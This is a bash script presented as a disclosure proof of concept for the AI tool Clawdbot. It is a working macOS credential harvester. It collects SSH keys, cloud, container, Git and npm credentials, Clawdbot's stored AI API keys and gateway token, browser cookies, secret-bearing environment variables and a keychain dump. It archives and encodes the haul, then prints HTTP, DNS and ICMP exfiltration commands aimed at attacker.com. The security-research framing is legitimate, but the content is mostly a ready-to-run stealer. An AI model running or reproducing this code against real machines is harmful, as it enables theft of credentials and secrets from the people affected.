#!/bin/bash
#
# Clawdbot Credential Harvester
# Exploitation Difficulty: TRIVIAL
# Prerequisites: Process running as target user
# Impact: CRITICAL - Full credential theft
#
# Responsible Disclosure - Educational Purposes Only
#

set -e

EXFIL_URL="${1:-https://attacker.com/collect}"
OUTPUT_FILE="/tmp/.harvest-$(date +%s).tar.gz"
HARVEST_DIR=$(mktemp -d)

echo "[+] Clawdbot Credential Harvester v1.0"
echo "[+] Target: macOS $(sw_vers -productVersion)"
echo "[+] User: $(whoami)"
echo "[+] Output: $OUTPUT_FILE"
echo ""

# Function to safely copy files
safe_copy() {
    local src="$1"
    local dst="$2"
    if [ -e "$src" ]; then
        cp -r "$src" "$dst" 2>/dev/null && echo "  ✓ Collected: $src"
    fi
}

# 1. SSH Keys & Configuration
echo "[1] Collecting SSH credentials..."
mkdir -p "$HARVEST_DIR/ssh"
safe_copy ~/.ssh/id_rsa "$HARVEST_DIR/ssh/"
safe_copy ~/.ssh/id_ed25519 "$HARVEST_DIR/ssh/"
safe_copy ~/.ssh/id_ecdsa "$HARVEST_DIR/ssh/"
safe_copy ~/.ssh/config "$HARVEST_DIR/ssh/"
safe_copy ~/.ssh/known_hosts "$HARVEST_DIR/ssh/"

# 2. AWS Credentials
echo "[2] Collecting AWS credentials..."
mkdir -p "$HARVEST_DIR/aws"
safe_copy ~/.aws/credentials "$HARVEST_DIR/aws/"
safe_copy ~/.aws/config "$HARVEST_DIR/aws/"

# 3. Clawdbot Credentials (PLAINTEXT!)
echo "[3] Collecting Clawdbot credentials..."
mkdir -p "$HARVEST_DIR/clawdbot"
safe_copy ~/.clawdbot/clawdbot.json "$HARVEST_DIR/clawdbot/"
safe_copy ~/.clawdbot/credentials "$HARVEST_DIR/clawdbot/"
safe_copy ~/Library/LaunchAgents/com.clawdbot.gateway.plist "$HARVEST_DIR/clawdbot/"

# Extract specific credentials from JSON
if [ -f ~/.clawdbot/clawdbot.json ]; then
    jq -r '.auth // {}' ~/.clawdbot/clawdbot.json > "$HARVEST_DIR/clawdbot/auth-keys.json" 2>/dev/null
    jq -r '.gateway // {}' ~/.clawdbot/clawdbot.json > "$HARVEST_DIR/clawdbot/gateway.json" 2>/dev/null
fi

# 4. Environment Variables
echo "[4] Collecting environment variables..."
mkdir -p "$HARVEST_DIR/env"
env | grep -iE 'key|token|password|secret|api|auth' | sort > "$HARVEST_DIR/env/vars.txt"

# 5. Docker Credentials
echo "[5] Collecting Docker credentials..."
mkdir -p "$HARVEST_DIR/docker"
safe_copy ~/.docker/config.json "$HARVEST_DIR/docker/"

# 6. Git Credentials
echo "[6] Collecting Git credentials..."
mkdir -p "$HARVEST_DIR/git"
git config --global --list > "$HARVEST_DIR/git/global-config.txt" 2>/dev/null || true
safe_copy ~/.gitconfig "$HARVEST_DIR/git/"
safe_copy ~/.git-credentials "$HARVEST_DIR/git/"

# 7. NPM Credentials
echo "[7] Collecting NPM credentials..."
mkdir -p "$HARVEST_DIR/npm"
safe_copy ~/.npmrc "$HARVEST_DIR/npm/"

# 8. Kubernetes Credentials
echo "[8] Collecting Kubernetes credentials..."
mkdir -p "$HARVEST_DIR/kube"
safe_copy ~/.kube/config "$HARVEST_DIR/kube/"

# 9. Browser Cookies & Session Storage
echo "[9] Collecting browser data..."
mkdir -p "$HARVEST_DIR/browser"
safe_copy ~/Library/Application\ Support/Google/Chrome/Default/Cookies "$HARVEST_DIR/browser/chrome-cookies.db"
safe_copy ~/Library/Application\ Support/Firefox/Profiles "$HARVEST_DIR/browser/"

# 10. macOS Keychain Entries (via security command)
echo "[10] Enumerating Keychain entries..."
mkdir -p "$HARVEST_DIR/keychain"
security dump-keychain > "$HARVEST_DIR/keychain/items.txt" 2>/dev/null || \
    echo "Keychain access requires password" > "$HARVEST_DIR/keychain/items.txt"

# List generic passwords (doesn't extract values without password)
security find-generic-password -a "" 2>/dev/null | \
    grep -E "acct|svce" > "$HARVEST_DIR/keychain/generic-passwords.txt" || true

# 11. System Information
echo "[11] Collecting system information..."
mkdir -p "$HARVEST_DIR/system"
sw_vers > "$HARVEST_DIR/system/version.txt"
whoami > "$HARVEST_DIR/system/user.txt"
hostname > "$HARVEST_DIR/system/hostname.txt"
ifconfig | grep "inet " > "$HARVEST_DIR/system/network.txt"
id > "$HARVEST_DIR/system/id.txt"
groups > "$HARVEST_DIR/system/groups.txt"

# List LaunchAgents for persistence opportunities
ls -la ~/Library/LaunchAgents/ > "$HARVEST_DIR/system/launch-agents.txt" 2>/dev/null

# 12. Running Processes
echo "[12] Enumerating processes..."
ps aux > "$HARVEST_DIR/system/processes.txt"

# Package everything
echo ""
echo "[+] Packaging collected data..."
tar czf "$OUTPUT_FILE" -C "$HARVEST_DIR" . 2>/dev/null

FILE_SIZE=$(ls -lh "$OUTPUT_FILE" | awk '{print $5}')
echo "  ✓ Archive created: $OUTPUT_FILE ($FILE_SIZE)"

# Encode for exfiltration
echo ""
echo "[+] Encoding for exfiltration..."
BASE64_FILE="${OUTPUT_FILE}.b64"
base64 "$OUTPUT_FILE" > "$BASE64_FILE"
BASE64_SIZE=$(ls -lh "$BASE64_FILE" | awk '{print $5}')
echo "  ✓ Base64 encoded: $BASE64_FILE ($BASE64_SIZE)"

# Exfiltration methods
echo ""
echo "[+] Exfiltration options:"
echo ""
echo "  1. HTTP POST:"
echo "     curl -X POST --data-binary @$BASE64_FILE $EXFIL_URL"
echo ""
echo "  2. DNS Exfiltration (chunked):"
echo "     cat $BASE64_FILE | fold -w 63 | while read chunk; do"
echo "       nslookup \${chunk}.exfil.attacker.com"
echo "     done"
echo ""
echo "  3. ICMP Exfiltration:"
echo "     cat $OUTPUT_FILE | xxd -p -c 16 | while read hex; do"
echo "       ping -c 1 -p \$hex attacker.com"
echo "     done"
echo ""
echo "  4. Steganography:"
echo "     steghide embed -cf cover.jpg -ef $OUTPUT_FILE -p password"
echo ""

# Summary
echo ""
echo "[+] Collection Summary:"
echo "  • SSH keys and config"
echo "  • AWS credentials"
echo "  • Clawdbot API keys (Anthropic, OpenAI, etc.)"
echo "  • Gateway authentication token"
echo "  • Docker credentials"
echo "  • Git credentials"
echo "  • NPM tokens"
echo "  • Kubernetes config"
echo "  • Browser cookies"
echo "  • Environment variables"
echo "  • System information"
echo ""
echo "[+] Cleanup (optional):"
echo "     rm -rf $HARVEST_DIR $OUTPUT_FILE $BASE64_FILE"
echo ""
echo "[!] This tool is for authorized security testing only."
echo "[!] Unauthorized use is illegal."
